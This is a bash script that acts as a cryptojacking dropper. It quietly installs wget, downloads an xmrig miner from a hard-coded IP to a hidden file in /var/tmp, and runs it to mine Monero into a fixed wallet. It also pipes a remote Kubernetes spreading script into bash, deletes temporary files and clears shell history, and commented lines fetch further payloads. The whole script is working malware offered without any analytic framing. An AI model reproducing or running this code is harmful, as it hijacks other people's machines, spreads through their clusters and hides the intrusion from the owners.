#!/bin/bash

# wget -q http://45.145.7.253/chimaera/sh/setup_xmr.sh -O /tmp/.tm

if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi ; fi
wget --no-check-certificate http://45.145.7.253/chimaera/bin/xmrig -O /var/tmp/.system
chmod +x /var/tmp/.system
cd /var/tmp/
./.system -o pool.supportxmr.com:3333 --donate-level=1 --coin=monero -u 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9 -p GesichtsKirmes -B
history -c
clear

#wget -q http://45.145.7.253/aws -O /tmp/.kernel
#chmod +x /tmp/.kernel
#/tmp/.kernel
#wget -O - borg.wtf/aws.sh | bash &

$(wget -O - http://45.145.7.253/chimaera/sh/spread_kube_loop.sh | bash || curl http://45.145.7.253/chimaera/sh/spread_kube_loop.sh | bash) &

rm -f /tmp/.x1mr
rm -f /tmp/.x2mr

history -c
clear
